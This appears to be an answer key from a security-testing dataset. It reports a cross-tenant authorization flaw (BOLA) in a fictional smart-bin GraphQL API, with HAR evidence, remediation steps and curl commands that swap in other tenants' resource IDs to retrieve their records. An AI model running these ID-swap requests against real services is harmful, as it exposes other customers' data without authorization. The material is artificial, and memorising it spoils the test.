# Expected Response

## System
- Domain: Waste Management / Smart Bins
- System: CleanRoute IoT Platform
- Example ID: GQL-0042

## Priority Findings

### Finding 1: ID Swap in Bulk Lookup — Single Authenticated User Accesses Cross-Tenant Smart Bin Records (Pattern 10.1)
**Severity:** Critical
**Category:** BOLA / Single-User ID Swap

**Summary:**
A single authenticated user from `tenant-db28` submitted `bulkResourceLookup(ids: ["R-2042", "R-1042", "R-3042"])`, substituting victim resource IDs (`tenant-2d3c` records) alongside their own. Per §5.0 (Pattern 10.1): "A single authenticated user substitutes their own valid `resourceId` with a victim's `resourceId`. With one token, data belonging to another user is accessible." The bulk lookup returned smart bin IoT records belonging to `tenant-2d3c`, including `sensitiveField: CONFIDENTIAL-db282d3c` and `internalNotes: Internal data exposed`. No additional account or privilege escalation is required — the single JWT is sufficient.

**Evidence from HAR:**
- Request: `POST https://api.cleanroute-iot-platf.example.com/graphql` (2026-04-13T16:22:34Z, 167 ms)
- JWT `x-tenant-id`: `tenant-db28` — single attacker token
- Mutation payload: `bulkResourceLookup(ids: ["R-2042", "R-1042", "R-3042"]) { resourceId tenantId data { sensitiveField } }` — victim IDs mixed in
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-2d3c` — cross-tenant IoT record returned
- Response `ownerId`: `other-user-db282d3c`
- Response `sensitiveField`: `CONFIDENTIAL-db282d3c` — smart bin operational data leaked
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-db282d3c`

**Root Cause (§4.0 RISK-GQL-042 + §5.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering." A single valid JWT is all that is required to retrieve any resource by ID — there is no resolver-level check that `resource.tenantId == jwt.tenantId` per item.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-042 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §4.0 | bulkResourceLookup note | "accepts an arbitrary array of IDs without per-ID ownership filtering" |
| context.txt §5.0 | Pattern 10.1 | "single user substitutes their own valid resourceId with a victim's resourceId" |
| HAR entry | request.postData | `bulkResourceLookup(ids: ["R-2042", "R-1042", "R-3042"])` from `tenant-db28` |
| HAR entry | response.content | `tenantId: "tenant-2d3c"`, `sensitiveField: "CONFIDENTIAL-db282d3c"` |

---

## Steps to Reproduce

### Step 1 — Confirm single-user baseline (own IDs work)
```bash
curl -s -X POST https://api.cleanroute-iot-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-db28" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-db28-001\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Expected:** Returns only `tenant-db28` records.

### Step 2 — ID swap: substitute victim IDs (HAR attack)
```bash
curl -s -X POST https://api.cleanroute-iot-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-db28" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2042\", \"R-1042\", \"R-3042\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-2d3c"`, `ownerId: "other-user-db282d3c"`, `sensitiveField: "CONFIDENTIAL-db282d3c"`, `internalNotes: "Internal data exposed"` — cross-tenant smart bin data accessed with single valid JWT.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"bulkResourceLookup": null}}` for cross-tenant IDs.

### Step 3 — Single ID swap via getResource
```bash
curl -s -X POST https://api.cleanroute-iot-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-db28" \
  -d '{"query": "query { getResource(id: \"R-2042\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-2d3c"` smart bin record — same BOLA via single ID substitution.
**Secure outcome:** HTTP 403 or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "bulkResourceLookup": null }
}
```

## Remediation
1. **Per-ID ownership filter in bulkResourceLookup:** For each ID in the input array, verify `tenant_id = $jwt.tenantId` before returning the record. Return null or FORBIDDEN for cross-tenant entries — no mixed-tenant response.
2. **Resolver-level tenant guard on getResource:** Apply `WHERE resource_id = $id AND tenant_id = $jwt.tenantId` (§4.0 RISK-GQL-042).
3. **Strip tenantId from listResources input:** The `tenantId` argument in `listResources` must be ignored — derive scope from JWT only.
4. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
5. **Automated regression tests:** Assert `tenant-db28` calling `bulkResourceLookup(["R-2042", "R-1042", "R-3042"])` receives FORBIDDEN or empty result for cross-tenant IDs.
